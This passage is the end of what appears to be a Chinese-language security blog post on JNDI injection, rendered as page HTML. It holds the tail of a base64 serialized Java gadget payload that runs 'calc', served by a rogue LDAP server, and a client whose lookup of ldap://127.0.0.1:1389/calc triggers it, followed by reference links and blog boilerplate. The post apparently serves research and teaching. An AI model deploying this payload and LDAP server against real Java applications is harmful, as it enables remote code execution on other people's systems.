1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            result<span style="color:#f92672">.</span><span style="color:#a6e22e">sendSearchEntry</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            result<span style="color:#f92672">.</span><span style="color:#a6e22e">setResult</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> LDAPResult<span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">,</span> ResultCode<span style="color:#f92672">.</span><span style="color:#a6e22e">SUCCESS</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><strong>客户端</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.Context<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.swing.*<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ldap</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String uri <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ldap://127.0.0.1:1389/calc&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        Context ctx <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        ctx<span style="color:#f92672">.</span><span style="color:#a6e22e">lookup</span><span style="color:#f92672">(</span>uri<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823230412025.png" alt="image-20230823230412025"></p>
+<h1 id="参考">参考</h1>
+<p><a href="https://xz.aliyun.com/t/10671#toc-12">高版本JDK下的JNDI注入浅析 - 先知社区 (aliyun.com)</a></p>
+<p><a href="https://tttang.com/archive/1611/#toc_gadget">JNDI注入分析 - 跳跳糖 (tttang.com)</a></p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/java/">java</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/2023wmctf-web/" data-tooltip="【2023WMCTF】Web-WP" aria-label="上一篇: 【2023WMCTF】Web-WP">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9\/';
+        
+          this.page.identifier = '\/post\/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 gkjzjh146. All Rights Reserved
+  </span>
+    <br>
+    
+    <div class="busuanzi-footer">
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+        <span id="busuanzi_container_site_uv">
+    本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+    </div></footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/2023wmctf-web/" data-tooltip="【2023WMCTF】Web-WP" aria-label="上一篇: 【2023WMCTF】Web-WP">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fjndi%25E6%25B3%25A8%25E5%2585%25A5%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>分享到 Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fjndi%25E6%25B3%25A8%25E5%2585%25A5%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fjndi%25E6%25B3%25A8%25E5%2585%25A5%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>分享到 Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+    
+    <h4 id="about-card-name">gkjzjh146</h4>
+    
+      <div id="about-card-bio">会点web，会点misc</div>
+    
+    
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://gkjzjh146.github.io/images/3.jpeg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://gkjzjh146.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
